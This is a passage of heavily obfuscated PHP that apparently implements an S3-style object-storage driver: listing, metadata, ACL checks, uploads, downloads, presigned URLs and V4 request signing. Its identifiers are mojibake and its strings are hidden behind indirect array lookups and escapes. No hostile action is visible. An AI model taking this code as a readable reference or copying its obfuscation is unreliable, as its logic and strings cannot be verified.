$ÊÓ—ªÊ[$†ğË§î±[79]] += $ôÌˆŒÂ¨[$†ğË§î±[79]]; } } private function fileInfo($À‰õŒ—ô, $«ü×ç›™ = false, $¹šÒ³ƒ• = array()) { $½û¤±² =& $_SERVER[±³—úê]; $“ÕÒÇ¯ü = array($½û¤±²[32] => $this->pathThis($À‰õŒ—ô), $½û¤±²[87] => $this->getPathOuter($À‰õŒ—ô), $½û¤±²[33] => $½û¤±²[242], $½û¤±²[169] => $this->ext($À‰õŒ—ô), $½û¤±²[79] => isset($¹šÒ³ƒ•[$½û¤±²[79]]) ? $¹šÒ³ƒ•[$½û¤±²[79]] : 0); if ($«ü×ç›™) { return $“ÕÒÇ¯ü; } $“ÕÒÇ¯ü[$½û¤±²[243]] = $“ÕÒÇ¯ü[$½û¤±²[88]] = 0; $“ÕÒÇ¯ü[$½û¤±²[244]] = $“ÕÒÇ¯ü[$½û¤±²[245]] = !0; if (empty($¹šÒ³ƒ•)) { $¹šÒ³ƒ• = $this->objectMeta($À‰õŒ—ô); if (!$¹šÒ³ƒ•) { return $“ÕÒÇ¯ü; } } if (isset($¹šÒ³ƒ•[$½û¤±²[246]]) && $¹šÒ³ƒ•[$½û¤±²[246]]) { $“ÕÒÇ¯ü[$½û¤±²[247]] = $¹šÒ³ƒ•[$½û¤±²[246]]; } if (isset($¹šÒ³ƒ•[$½û¤±²[206]])) { $“ÕÒÇ¯ü[$½û¤±²[88]] = $¹šÒ³ƒ•[$½û¤±²[206]]; } if (isset($¹šÒ³ƒ•[$½û¤±²[79]])) { $“ÕÒÇ¯ü[$½û¤±²[79]] = $¹šÒ³ƒ•[$½û¤±²[79]]; } return $“ÕÒÇ¯ü; } private function folderInfo($„§Èû¤É, $Ï¦õñİ˜ = false, $§ÃÀ“Ê = array()) { $§å¾ÌÎÔ =& $_SERVER[±³—úê]; $é§Áí¢ = array($§å¾ÌÎÔ[32] => $this->pathThis($„§Èû¤É), $§å¾ÌÎÔ[87] => $this->getPathOuter($§å¾ÌÎÔ[8] . $„§Èû¤É), $§å¾ÌÎÔ[33] => $§å¾ÌÎÔ[78]); if ($Ï¦õñİ˜) { return $é§Áí¢; } $é§Áí¢[$§å¾ÌÎÔ[243]] = $é§Áí¢[$§å¾ÌÎÔ[88]] = 0; $é§Áí¢[$§å¾ÌÎÔ[244]] = $é§Áí¢[$§å¾ÌÎÔ[245]] = !0; if ($„§Èû¤É == $§å¾ÌÎÔ[12]) { return $é§Áí¢; } if (empty($§ÃÀ“Ê)) { $§ÃÀ“Ê = $this->objectMeta(trim($„§Èû¤É, $§å¾ÌÎÔ[8]) . $§å¾ÌÎÔ[8]); } if (isset($§ÃÀ“Ê[$§å¾ÌÎÔ[206]])) { $é§Áí¢[$§å¾ÌÎÔ[243]] = $§ÃÀ“Ê[$§å¾ÌÎÔ[206]]; } return $é§Áí¢; } private function fileList($ ½šÕƒş, $°àò–£„ = '', $µÈè˜—â = 0) { $ã„ƒÌ½Ş =& $_SERVER[±³—úê]; $ÈÉêÌé˜ = rtrim($ ½šÕƒş, $ã„ƒÌ½Ş[8]) . $ã„ƒÌ½Ş[8]; $óù½±õ = $this->listObjs($ÈÉêÌé˜, null, null, $°àò–£„); if (!$óù½±õ) { return array($ã„ƒÌ½Ş[85] => array(), $ã„ƒÌ½Ş[86] => array()); } $õˆßİÜ  = $¿ûÌ¸Ú = array(); foreach ($óù½±õ[$ã„ƒÌ½Ş[248]] as $Ê›¬…ì) { $êÏô‡ä = $Ê›¬…ì[$ã„ƒÌ½Ş[32]]; if ($êÏô‡ä == $ÈÉêÌé˜) { continue; } $ª‚ïçåÌ = isset($Ê›¬…ì[$ã„ƒÌ½Ş[79]]) ? $Ê›¬…ì[$ã„ƒÌ½Ş[79]] : 0; $Õ¶Óíé = $ª‚ïçåÌ == 0 && substr($êÏô‡ä, strlen($êÏô‡ä) - 1, 1) == $ã„ƒÌ½Ş[8] ? !0 : !1; $this->cacheMethodInfoSet($êÏô‡ä, $Õ¶Óíé, $Ê›¬…ì); if ($Õ¶Óíé) { $õˆßİÜ [] = $êÏô‡ä; continue; } $¿ûÌ¸Ú[] = $µÈè˜—â ? $Ê›¬…ì : $êÏô‡ä; } foreach ($óù½±õ[$ã„ƒÌ½Ş[249]] as $Ê›¬…ì) { $õˆßİÜ [] = $Ê›¬…ì[$ã„ƒÌ½Ş[32]]; $this->cacheMethodInfoSet($Ê›¬…ì[$ã„ƒÌ½Ş[32]], !0); } $this->cacheMethodInfoSet($ ½šÕƒş, !0); return array($ã„ƒÌ½Ş[85] => $õˆßİÜ , $ã„ƒÌ½Ş[86] => $¿ûÌ¸Ú); } private function listObjs($Î‡’òùı, $Æ•ıÕƒî = null, $æõıÃİ = null, $ÆÕéÆ ƒ = null) { $ÖÄÌ‘Ø =& $_SERVER[±³—úê]; $Î‡’òùı = trim($Î‡’òùı, $ÖÄÌ‘Ø[8]); $¨ÏåÂÑò = empty($Î‡’òùı) && $Î‡’òùı !== $ÖÄÌ‘Ø[240] ? $ÖÄÌ‘Ø[12] : $Î‡’òùı . $ÖÄÌ‘Ø[8]; return $this->client->getBucket($this->bucket, $¨ÏåÂÑò, $Æ•ıÕƒî, $æõıÃİ, $ÆÕéÆ ƒ, !0); } public function has($œƒë¥í, $Ëûœ…èû = false, $¦šÙÅ¦ì = true) { $¶¢ôÛ =& $_SERVER[±³—úê]; $œƒë¥í = trim($œƒë¥í, $¶¢ôÛ[8]); $‹“şŸ°‚ = empty($œƒë¥í) && $œƒë¥í !== $¶¢ôÛ[240] ? $¶¢ôÛ[12] : $œƒë¥í . $¶¢ôÛ[8]; $Ùæßô÷° = null; $âª¹ïÀ = 500; $ÏŠá÷Ùß = $¶¢ôÛ[8]; $ºÛûÂÆ» = $“²²£¡ = array(); while (!0) { $üğºÊÖş = $this->listObjs($œƒë¥í, $Ùæßô÷°, $âª¹ïÀ, $ÏŠá÷Ùß); if (!$üğºÊÖş) { break; } $Ùæßô÷° = $üğºÊÖş[$¶¢ôÛ[250]]; $Ùæ²çÚİ = $üğºÊÖş[$¶¢ôÛ[248]]; $üŠ€Â¹ş = $üğºÊÖş[$¶¢ôÛ[249]]; if (empty($Ùæ²çÚİ) && empty($üŠ€Â¹ş)) { break; } if (count($Ùæ²çÚİ) == 1 && $Ùæ²çÚİ[0][$¶¢ôÛ[32]] == $‹“şŸ°‚) { break; } if ($Ëûœ…èû) { if (count($Ùæ²çÚİ)) { $Ùæ²çÚİ = array_column($Ùæ²çÚİ, $¶¢ôÛ[32]); $ºÛûÂÆ» = array_merge($ºÛûÂÆ», $Ùæ²çÚİ); } if (count($üŠ€Â¹ş)) { $üŠ€Â¹ş = array_column($üŠ€Â¹ş, $¶¢ôÛ[32]); $“²²£¡ = array_merge($“²²£¡, $üŠ€Â¹ş); } if ($Ùæßô÷° === null) { break; } continue; } if ($¦šÙÅ¦ì) { if (!empty($Ùæ²çÚİ)) { if (count($Ùæ²çÚİ) > 1 || isset($Ùæ²çÚİ[0][$¶¢ôÛ[32]]) && $Ùæ²çÚİ[0][$¶¢ôÛ[32]] != $‹“şŸ°‚) { return !0; } } } else { if (!empty($üŠ€Â¹ş)) { return !0; } } if ($Ùæßô÷° === null) { break; } } if ($Ëûœ…èû) { $ºÛûÂÆ» = array_diff($ºÛûÂÆ», array($‹“şŸ°‚)); $ºÛûÂÆ» = count(array_unique($ºÛûÂÆ»)); $“²²£¡ = count(array_unique($“²²£¡)); return array($¶¢ôÛ[251] => $ºÛûÂÆ», $¶¢ôÛ[252] => $“²²£¡); } return !1; } public function listAll($ü Ñî¾¨) { $¿ÍÉÎò =& $_SERVER[±³—úê]; $•Ï‡‘Ú‹ = $this->fileList($ü Ñî¾¨, $¿ÍÉÎò[12], !0); $õäĞ£«ñ = array_to_keyvalue($•Ï‡‘Ú‹[$¿ÍÉÎò[86]], $¿ÍÉÎò[32]); foreach ($•Ï‡‘Ú‹[$¿ÍÉÎò[85]] as $¢¼ß âı) { if (is_string($¢¼ß âı)) { $õäĞ£«ñ[$¢¼ß âı] = array($¿ÍÉÎò[79] => 0); } } return $this->listAllFiles($ü Ñî¾¨, $õäĞ£«ñ); } public function canRead($ƒ÷¥Š£º) { $…ó†İ˜© =& $_SERVER[±³—úê]; $ëúú£·ï = $this->client->getAccessControlPolicy($this->bucket, $ƒ÷¥Š£º); if (!$ëúú£·ï) { return !1; } return in_array($ëúú£·ï, array($…ó†İ˜©[253], $…ó†İ˜©[254], $…ó†İ˜©[255])) ? !0 : !1; } public function canWrite($·î”Á™) { $Æû»ºÎŒ =& $_SERVER[±³—úê]; $×øı©³ = $this->client->getAccessControlPolicy($this->bucket, $·î”Á™); if (!$×øı©³) { return !1; } return in_array($×øı©³, array($Æû»ºÎŒ[253], $Æû»ºÎŒ[254])) ? !0 : !1; } public function getContent($Ê¨»ç«½) { return $this->client->getObject($this->bucket, $Ê¨»ç«½); } public function setContent($çÄåöí“, $é¦ÜÖÍí = '', $Š¾ØßìÊ = false) { $Ï¤œæä™ =& $_SERVER[±³—úê]; $çÄåöí“ = $Š¾ØßìÊ ? trim($çÄåöí“, $Ï¤œæä™[8]) . $Ï¤œæä™[8] : $çÄåöí“; $¿ÕÂœ¯™ = get_file_mime(get_path_ext($çÄåöí“)); $—­‰ôÆ = $this->client->putObject($é¦ÜÖÍí, $this->bucket, $çÄåöí“, $Ï¤œæä™[241], array(), $¿ÕÂœ¯™); if (!$—­‰ôÆ) { return !1; } if ($Š¾ØßìÊ) { return !0; } return $—­‰ôÆ ? !0 : !1; } public function fileSubstr($Ú¿¬…åõ, $Û»Úıİ‘, $ë«¬ Ö) { $öõùæş­ = $Û»Úıİ‘ + $ë«¬ Ö - 1; return $this->client->getObject($this->bucket, $Ú¿¬…åõ, array($_SERVER[±³—úê][256] => "\142\171\x74\145\x73\x3d{$Û»Úıİ‘}\x2d{$öõùæş­}")); } public function upload($Ü£â³½÷, $ììÅÜñ€, $ëÏ¶àªĞ = false, $ñµÒëá“ = REPEAT_REPLACE) { $¸ã«–ã¸ =& $_SERVER[±³—úê]; $‘§äÚ’í = array($¸ã«–ã¸[257] => @md5_file($ììÅÜñ€)); $å‡™×ş« = array($¸ã«–ã¸[258] => get_file_mime(get_path_ext($Ü£â³½÷))); if (IO::size($ììÅÜñ€) <= 1024 * 1024 * 200) { $ô ˆƒ¡ä = $this->client->putObjectFile($ììÅÜñ€, $this->bucket, $Ü£â³½÷, $¸ã«–ã¸[241], $‘§äÚ’í, $å‡™×ş«); return !empty($ô ˆƒ¡ä) ? $this->getPathOuter($Ü£â³½÷) : !1; } $ŒÍ˜†÷· = $this->client->multiUploadObject($ììÅÜñ€, $this->bucket, trim($Ü£â³½÷, $¸ã«–ã¸[8]), $‘§äÚ’í, $å‡™×ş«); return $ŒÍ˜†÷· ? $this->getPathOuter($Ü£â³½÷) : !1; } public function download($×©¯®ŸÇ, $É­´ˆâ¾) { if (!@is_dir($this->pathFather($É­´ˆâ¾)) && !IO::mkdir($this->pathFather($É­´ˆâ¾))) { return !1; } $¼ÃŞğ× = $this->client->getObject($this->bucket, $×©¯®ŸÇ, array(), $É­´ˆâ¾); return $¼ÃŞğ× !== !1 ? $É­´ˆâ¾ : !1; } public function link($ ¢Ö«Êı, $‚Åâıó— = array()) { return $this->getPreSignedURL($ ¢Ö«Êı, 3600 * 12, $‚Åâıó—); } private function getPreSignedURL($·ÍĞôÙğ, $«òÑæöç, $×ÇÜ¬¯¨ = array(), $ßÚ°Óí = "\107\105\x54") { $—¸³’íû =& $_SERVER[±³—úê]; $·ÍĞôÙğ = trim($·ÍĞôÙğ, $—¸³’íû[8]); if ($this->signVer == $—¸³’íû[259]) { return $this->client->getPreSignedV2URL($this->bucket, $·ÍĞôÙğ, $«òÑæöç, $ßÚ°Óí, $×ÇÜ¬¯¨); } return $this->client->getPreSignedV4URL($this->bucket, $·ÍĞôÙğ, $«òÑæöç, array(), $ßÚ°Óí, $×ÇÜ¬¯¨); } public function fileOut($Âº÷èÒÊ, $Àé’›á² = false, $­ó¨‹Êï = false, $É›Õ’ûŒ = '') { $³™»äÎÀ =& $_SERVER[±³—úê]; if ($this->isFileOutServer()) { return $this->fileOutServer($Âº÷èÒÊ, $Àé’›á², $­ó¨‹Êï, $É›Õ’ûŒ); } if (!$­ó¨‹Êï) { $­ó¨‹Êï = $this->pathThis($Âº÷èÒÊ); } $‘œÉäç— = get_file_mime(get_path_ext($­ó¨‹Êï)); if ($‘œÉäç— == $³™»äÎÀ[260]) { return parent::fileOut($Âº÷èÒÊ, $Àé’›á², $­ó¨‹Êï, $É›Õ’ûŒ); } $ğ¤’ÁôÊ = array($³™»äÎÀ[261] => $‘œÉäç—); if ($Àé’›á²) { $ğ¤’ÁôÊ[$³™»äÎÀ[262]] = $³™»äÎÀ[263] . rawurlencode($­ó¨‹Êï); } else { } $½Şô£â· = $this->link($Âº÷èÒÊ, $ğ¤’ÁôÊ); $this->fileOutLink($½Şô£â·); } public function fileOutServer($şÔéãª, $Ô…‚¾‹ö = false, $Á¡ğˆ›¯ = false, $˜Ã¹ƒè™ = '') { parent::fileOut($şÔéãª, $Ô…‚¾‹ö, $Á¡ğˆ›¯, $˜Ã¹ƒè™); } public function fileOutImageServer($èËê™ÙÆ, $³Û¶Úæ = 250) { parent::fileOutImage($èËê™ÙÆ, $³Û¶Úæ); } public function hashMd5($Ğ´š³™×, $ã™øü•Ø = '') { $’ï±Óµ = $this->objectMeta($Ğ´š³™×); if (!$’ï±Óµ) { return !1; } $ã™øü•Ø = $ã™øü•Ø ? $ã™øü•Ø : _get($’ï±Óµ, $_SERVER[±³—úê][264]); return $ã™øü•Ø; } public function uploadFormData($Ğˆ„¤Ú, $ì†âÑ×÷ = 3600) { $Á‰ƒÛ² =& $_SERVER[±³—úê]; if (!$this->_isClientAsync()) { $ÆœõÔçŠ = $this->getPreSignedURL($Ğˆ„¤Ú, $ì†âÑ×÷, array(), $Á‰ƒÛ²[265]); return array($Á‰ƒÛ²[208] => str_replace($Á‰ƒÛ²[228], $Á‰ƒÛ²[266], $ÆœõÔçŠ)); } if (isset($GLOBALS[$Á‰ƒÛ²[6]][$Á‰ƒÛ²[92]][$Á‰ƒÛ²[267]]) && $GLOBALS[$Á‰ƒÛ²[6]][$Á‰ƒÛ²[92]][$Á‰ƒÛ²[267]] == $Á‰ƒÛ²[240]) { return $this->uploadMultiData($Ğˆ„¤Ú, $ì†âÑ×÷); } if ($this->signVer == $Á‰ƒÛ²[259]) { return $this->uploadFormDataV2($Ğˆ„¤Ú, $ì†âÑ×÷); } return $this->uploadFormDataV4($Ğˆ„¤Ú, $ì†âÑ×÷); } public function uploadFormDataV2($­ı¸ ÔÛ, $±œ±ã = 3600) { $šƒ°¹¬ó =& $_SERVER[±³—úê]; $Œı«ÌÙ– = $this->pathFather($­ı¸ ÔÛ); $Ü’øÇÇÄ = $this->client->getHttpUploadPostParams($this->bucket, $Œı«ÌÙ–, $šƒ°¹¬ó[241], $±œ±ã); $ùØÛœÃ = array_merge((array) $Ü’øÇÇÄ, array($šƒ°¹¬ó[268] => $šƒ°¹¬ó[259], $šƒ°¹¬ó[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($ùØÛœÃ[$šƒ°¹¬ó[268]]); } return $ùØÛœÃ; } public function uploadFormDataV4($±Ç½Í²É, $‘†ªŒŠı = 3600) { $ÍÆ£ÇÍõ =& $_SERVER[±³—úê]; $÷ÍöÛ¹ = $ÍÆ£ÇÍõ[241]; $„ëª¼ÓŸ = $ÍÆ£ÇÍõ[269]; $®Î¼ß = $ÍÆ£ÇÍõ[62]; $‚ÈÊÙÜß = gmdate($ÍÆ£ÇÍõ[270]); $÷›ĞÔî = gmdate($ÍÆ£ÇÍõ[271]); $°­ÈÄ¥Š = $ÍÆ£ÇÍõ[272]; $“®ÖŠ = $‘†ªŒŠı . $ÍÆ£ÇÍõ[12]; $ê‰Êøµª = $ÍÆ£ÇÍõ[273]; $½§Û¿Ê§ = array($this->accessKey, $÷›ĞÔî, $this->region, $®Î¼ß, $°­ÈÄ¥Š); $±«Å¨×¹ = implode($ÍÆ£ÇÍõ[8], $½§Û¿Ê§); $òÎÃûì´ = array($ÍÆ£ÇÍõ[274] => gmdate($ÍÆ£ÇÍõ[275], strtotime($ÍÆ£ÇÍõ[276])), $ÍÆ£ÇÍõ[277] => array(array($ÍÆ£ÇÍõ[278] => $this->bucket), array($ÍÆ£ÇÍõ[279], $ÍÆ£ÇÍõ[280], $ÍÆ£ÇÍõ[12]), array($ÍÆ£ÇÍõ[279], $ÍÆ£ÇÍõ[281], $ÍÆ£ÇÍõ[12]), array($ÍÆ£ÇÍõ[282] => $ê‰Êøµª), array($ÍÆ£ÇÍõ[283] => $±«Å¨×¹), array($ÍÆ£ÇÍõ[284] => $„ëª¼ÓŸ), array($ÍÆ£ÇÍõ[285] => $‚ÈÊÙÜß), array($ÍÆ£ÇÍõ[286] => $“®ÖŠ))); $…òÆçÂ = base64_encode(json_encode($òÎÃûì´)); $åŒ‘üÆÛ = hash_hmac($ÍÆ£ÇÍõ[287], $÷›ĞÔî, $ÍÆ£ÇÍõ[288] . $this->secret, !0); $Ÿ”ÒøÃ = hash_hmac($ÍÆ£ÇÍõ[287], $this->region, $åŒ‘üÆÛ, !0); $õœ¦îÍ = hash_hmac($ÍÆ£ÇÍõ[287], $®Î¼ß, $Ÿ”ÒøÃ, !0); $ÀæÚø€å = hash_hmac($ÍÆ£ÇÍõ[287], $°­ÈÄ¥Š, $õœ¦îÍ, !0); $‰ÂßšÅ = hash_hmac($ÍÆ£ÇÍõ[287], $…òÆçÂ, $ÀæÚø€å); $¬àš£¤¼ = array($ÍÆ£ÇÍõ[258] => $ÍÆ£ÇÍõ[12], $ÍÆ£ÇÍõ[282] => $ê‰Êøµª, $ÍÆ£ÇÍõ[289] => $…òÆçÂ, $ÍÆ£ÇÍõ[283] => $±«Å¨×¹, $ÍÆ£ÇÍõ[284] => $„ëª¼ÓŸ, $ÍÆ£ÇÍõ[285] => $‚ÈÊÙÜß, $ÍÆ£ÇÍõ[286] => $“®ÖŠ, $ÍÆ£ÇÍõ[290] => $‰ÂßšÅ, $ÍÆ£ÇÍõ[268] => $ÍÆ£ÇÍõ[259], $ÍÆ£ÇÍõ[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($¬àš£¤¼[$ÍÆ£ÇÍõ[268]]); } return $¬àš£¤¼; } public function uploadMultiData($¿ÌÀÎò¬, $°à´ªÄ  = 3600) { $†Õ£Ó½¨ =& $_SERVER[±³—úê]; $ºÖô¿Û‘ = $this->signVer == $†Õ£Ó½¨[259] ? gmdate($†Õ£Ó½¨[291]) : gmdate($†Õ£Ó½¨[292]); $Š‘ÁµÅë = array(); $ß®ˆï˜© = $this->client->getUploadId($this->bucket, $¿ÌÀÎò¬, $Š‘ÁµÅë); if (!$ß®ˆï˜©) { return !1; } $ªìùÆ² = array($†Õ£Ó½¨[293] => $ß®ˆï˜©, $†Õ£Ó½¨[208] => $this->getHost() . $†Õ£Ó½¨[8] . $this->pathEncode($¿ÌÀÎò¬), $†Õ£Ó½¨[294] => $ºÖô¿Û‘, $†Õ£Ó½¨[97] => $¿ÌÀÎò¬, $†Õ£Ó½¨[268] => $this->signVer); if ($this->_isClientAsync()) { unset($ªìùÆ²[$†Õ£Ó½¨[268]]); } return $ªìùÆ²; } public function uploadMultiAuth($ßë›­İ, $–ª£Ñõ = array()) { $¹±Í†®± =& $_SERVER[±³—úê]; if ($this->signVer == $¹±Í†®±[259]) { if (isset($–ª£Ñõ[$¹±Í†®±[295]])) { return $this->uploadPartAuthV2($ßë›­İ, $–ª£Ñõ); } return $this->uploadListAuthV2($ßë›­İ, $–ª£Ñõ); } if (isset($–ª£Ñõ[$¹±Í†®±[295]])) { return $this->uploadPartAuthV4($ßë›­İ, $–ª£Ñõ); } return $this->uploadListAuthV4($ßë›­İ, $–ª£Ñõ); } public function uploadPartAuthV2($š°ªÈ, $š ‹±°Ç = array()) { $…‚¹Åê =& $_SERVER[±³—úê]; $Æ†³ïÄ¦ = $š ‹±°Ç[$…‚¹Åê[97]]; $ÕŞ’Ñé = gmdate($…‚¹Åê[291]); $‘–õƒ¹« = array_intersect_key($š ‹±°Ç, array_flip(array($…‚¹Åê[295], $…‚¹Åê[293]))); ksort($‘–õƒ¹«); $Ö—â¥‘ = $‘–õƒ¹« ? $…‚¹Åê[76] . http_build_query($‘–õƒ¹«, null, $…‚¹Åê[296], PHP_QUERY_RFC3986) : $…‚¹Åê[12]; $şèú‡Ÿ = array($…‚¹Åê[265], $…‚¹Åê[12], $…‚¹Åê[123], $…‚¹Åê[12], "\170\55\x61\155\x7a\x2d\x64\141\164\145\72{$ÕŞ’Ñé}", $…‚¹Åê[8] . $this->bucket . $…‚¹Åê[8] . $this->pathEncode($Æ†³ïÄ¦) . $Ö—â¥‘); $ã¦É×ÎÀ = implode($…‚¹Åê[221], $şèú‡Ÿ); $Í–ìªÜ³ = $this->client->__getSignature($ã¦É×ÎÀ); return array($…‚¹Åê[297] => $Í–ìªÜ³, $…‚¹Åê[294] => $ÕŞ’Ñé); } public function uploadListAuthV2($™Â¦ò, $áÆ“¢¾¯ = array()) { $òäşìœÆ =& $_SERVER[±³—úê]; $”øÍ‰¶÷ = $áÆ“¢¾¯[$òäşìœÆ[97]]; $‡û¾ºã = $áÆ“¢¾¯[$òäşìœÆ[293]]; $Ğ®Å×¢‡ = $this->client->listParts($this->bucket, $”øÍ‰¶÷, $‡û¾ºã); if (!$Ğ®Å×¢‡) { return !1; } $Üëè©·È = gmdate($òäşìœÆ[291]); $¿÷Ã…ıÉ = $òäşìœÆ[298] . $‡û¾ºã; $Óùı„ğŸ = array($òäşìœÆ[299], $òäşìœÆ[12], $òäşìœÆ[123], $òäşìœÆ[12], "\x78\x2d\x61\x6d\x7a\x2d\x64\141\x74\145\x3a{$Üëè©·È}", $òäşìœÆ[8] . $this->bucket . $òäşìœÆ[8] . $this->pathEncode($”øÍ‰¶÷) . $¿÷Ã…ıÉ); $ÊİÅàÓ² = implode($òäşìœÆ[221], $Óùı„ğŸ); $ÜÛÍ¿Ä = $this->client->__getSignature($ÊİÅàÓ²); return array($òäşìœÆ[297] => $ÜÛÍ¿Ä, $òäşìœÆ[294] => $Üëè©·È, $òäşìœÆ[300] => $Ğ®Å×¢‡); } public function uploadPartAuthV4($ø¤ôÍãÑ, $¯¤ûïé¼ = array()) { $òñƒ‡šı =& $_SERVER[±³—úê]; $©Üù¯óÄ = $¯¤ûïé¼[$òñƒ‡šı[97]]; $Øº¶‚ = array($òñƒ‡šı[285] => gmdate($òñƒ‡šı[292]), $òñƒ‡šı[301] => _get($¯¤ûïé¼, $òñƒ‡šı[302], hash($òñƒ‡šı[287], $òñƒ‡šı[12]))); $´ö¯„¦ = explode($òñƒ‡šı[210], $this->getHost()); $¥Ç¦üâ = array($òñƒ‡šı[303] => $´ö¯„¦[1], $òñƒ‡šı[304] => $òñƒ‡šı[12], $òñƒ‡šı[258] => $òñƒ‡šı[123], $òñƒ‡šı[305] => $¯¤ûïé¼[$òñƒ‡šı[79]]); $½äÖŒŞ¯ = $òñƒ‡šı[265]; $ÎùûÀò¡ = $òñƒ‡šı[8] . $this->pathEncode($©Üù¯óÄ); $Î×ûÆä¶ = array_intersect_key($¯¤ûïé¼, array_flip(array($òñƒ‡šı[295], $òñƒ‡šı[293]))); $ÄéÖÙÉø = $this->client->__getSignatureV4($Øº¶‚, $¥Ç¦üâ, $½äÖŒŞ¯, $ÎùûÀò¡, $Î×ûÆä¶); return array($òñƒ‡šı[297] => $ÄéÖÙÉø, $òñƒ‡šı[301] => $Øº¶‚[$òñƒ‡šı[301]], $òñƒ‡šı[294] => $Øº¶‚[$òñƒ‡šı[285]]); } public function uploadListAuthV4($†è¯Àˆª, $îŠÈìÁ = array()) { $äÙùÇ  =& $_SERVER[±³—úê]; $Ÿšò¦Å÷ = $îŠÈìÁ[$äÙùÇ [97]]; $ËÁç = $îŠÈìÁ[$äÙùÇ [293]]; $Øş«—Çª = $this->client->listParts($this->bucket, $Ÿšò¦Å÷, $ËÁç); if (!$Øş«—Çª) { return !1; } $¼¹ë³Ò¸ = $äÙùÇ [306]; foreach ($Øş«—Çª as $Ôûò¯®») { $¼¹ë³Ò¸ .= $äÙùÇ [307] . "\74\120\x61\162\x74\x4e\165\155\142\145\x72\76{$Ôûò¯®»[$äÙùÇ [308]]}\74\57\120\141\162\164\116\x75\155\142\145\162\x3e\12" . "\x3c\105\x54\141\147\76{$Ôûò¯®»[$äÙùÇ [309]]}\x3c\57\105\124\141\x67\x3e\xa" . $äÙùÇ [310]; } $¼¹ë³Ò¸ .= $äÙùÇ [311]; $îÛ¯ÏÌÎ = array($äÙùÇ [285] => gmdate($äÙùÇ [292]), $äÙùÇ [301] => hash($äÙùÇ [287], $¼¹ë³Ò¸)); $®øİİ¡ô = explode($äÙùÇ [210], $this->getHost()); $Áñ»òÓÈ = array($äÙùÇ [303] => $®øİİ¡ô[1], $äÙùÇ [258] => $äÙùÇ [123], $äÙùÇ [305] => strlen($¼¹ë³Ò¸)); $Öë´¿€µ = $äÙùÇ [299]; $øî—Ã»Ë = $äÙùÇ [8] . $this->pathEncode($Ÿšò¦Å÷); $„‘—û»¯ = array($äÙùÇ [293] => $ËÁç); $ëøûŞäù = $this->client->__getSignatureV4($îÛ¯ÏÌÎ, $Áñ»òÓÈ, $Öë´¿€µ, $øî—Ã»Ë, $„‘—û»¯); return array($äÙùÇ [297] => $ëøûŞäù, $äÙùÇ [301] => $îÛ¯ÏÌÎ[$äÙùÇ [301]], $äÙùÇ [294] => $îÛ¯ÏÌÎ[$äÙùÇ [285]], $äÙùÇ [300] => $Øş«—Çª); } private function _isClientAsync() { $š›ÑÖñ =& $_SERVER[±³—úê]; static $ö‰¦«ïô = null; if ($ö‰¦«ïô === null) { $…ä¹óà° = isset($_REQUEST[$š›ÑÖñ[312]]) ? json_decode($_REQUEST[$š›ÑÖñ[312]], !0) : !1; $ö‰¦«ïô = $…ä¹óà° && _get($…ä¹óà°, $š›ÑÖñ[313]) == $š›ÑÖñ[314]; } return $ö‰¦«ïô; } public function getHost() { $¶í®¯³Õ =& $_SERVER[±³—úê]; $ôö¥ÚÂ÷ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($¶í®¯³Õ[70], $¶í®¯³Õ[64], $¶í®¯³Õ[69], $¶í®¯³Õ[62]))) { return $ôö¥ÚÂ÷ . $¶í®¯³Õ[8] . $this->bucket; } if ($this->osType == $¶í®¯³Õ[62] && !is_domain($ôö¥ÚÂ÷)) { return $ôö¥ÚÂ÷ . $¶í®¯³Õ[8] . $this->bucket; } $ôö¥ÚÂ÷ = explode($¶í®¯³Õ[210], $ôö¥ÚÂ÷); return $ôö¥ÚÂ÷[0] . $¶í®¯³Õ[210] . $this->bucket . $¶í®¯³Õ[10] . $ôö¥ÚÂ÷[1]; } public function size($á’Ÿëø) { $·£€ˆÊÒ = $this->objectMeta($á’Ÿëø); return $·£€ˆÊÒ ? $·£€ˆÊÒ[$_SERVER[±³—úê][79]] : 0; } public function info($»ú²€Ë¬) { if ($this->isFolder($»ú²€Ë¬)) { return $this->folderInfo($»ú²€Ë¬); } else { if ($this->isFile($»ú²€Ë¬)) { return $this->fileInfo($»ú²€Ë¬); } } return !1; } public function exist($‰˜û÷Ëï) { return $this->isFile($‰˜û÷Ëï) || $this->isFolder($‰˜û÷Ëï); } public function isFile($´…Ìóï“) { return !$this->isFolder($´…Ìóï“) && $this->objectMeta($´…Ìóï“); } public function isFolder($æ–‹™ÙÏ) { return $this->cacheMethod($_SERVER[±³—úê][179], $æ–‹™ÙÏ); } protected function objectMeta($…­ÔÒ³‹) { return $this->cacheMethod($_SERVER[±³—úê][181], $…­ÔÒ³‹); } protected function _objectMeta($Óß®äÛÛ) { $¼€‚‘Ò =& $_SERVER[±³—úê]; $Óß®äÛÛ = rtrim($Óß®äÛÛ, $¼€‚‘Ò[8]); try { $óæõï†Œ = $this->client->getObjectInfo($this->bucket, $Óß®äÛÛ); if (!isset($óæõï†Œ[$¼€‚‘Ò[264]]) && isset($óæõï†Œ[$¼€‚‘Ò[315]])) { $óæõï†Œ[$¼€‚‘Ò[264]] = $óæõï†Œ[$¼€‚‘Ò[315]]; } } catch (Exception $Ìµ«ãìô) { $óæõï†Œ = !1; } if (!$óæõï†Œ) { } return $óæõï†Œ; } protected function _isFolder($ÇúİºÓ®) { $»îâ¬Ù­ =& $_SERVER[±³—úê]; $ÇúİºÓ® = rtrim($ÇúİºÓ®, $»îâ¬Ù­[8]) . $»îâ¬Ù­[8]; if ($ÇúİºÓ® == $»îâ¬Ù­[12] || $ÇúİºÓ® == $»îâ¬Ù­[8]) { return !0; } $¯—Ì™Å = $this->client->getBucket($this->bucket, $ÇúİºÓ®, null, 1); if (empty($¯—Ì™Å[$»îâ¬Ù­[248]])) { return !1; } $Àêß‚³® = $¯—Ì™Å[$»îâ¬Ù­[248]][0][$»îâ¬Ù­[32]]; return stripos($Àêß‚³®, $ÇúİºÓ®) === 0 ? !0 : !1; if (substr($Àêß‚³®, -1) == $»îâ¬Ù­[8]) { return !0; } if (get_path_this($Àêß‚³®) == get_path_this($ÇúİºÓ®)) { return !1; } return !0; } public function listObject($µéİ¨–) { return $this->fileList($µéİ¨–, $_SERVER[±³—úê][12], !0); } } goto Bà†˜®Õ„Ñ; A®Ö¹©¡è: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\171\124\x69\x6d\145", "\x74\x69\x6d\x65", 